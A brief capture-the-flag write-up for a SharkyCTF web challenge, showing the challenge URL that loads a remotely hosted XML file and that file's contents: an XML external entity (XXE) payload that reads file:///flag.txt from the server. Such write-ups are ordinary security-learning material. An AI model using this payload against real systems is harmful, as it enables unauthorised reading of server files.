# XXExternalXX

http://xxexternalxx.sharkyctf.xyz/?xml=http://empty.jack.su/6e13400f89d5047731b4095a7d151f1c/13373.xml

file:
```
<?xml version="1.0" ?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM 'file:///flag.txt'>]>
<root><data>&xxe;</data></root>
```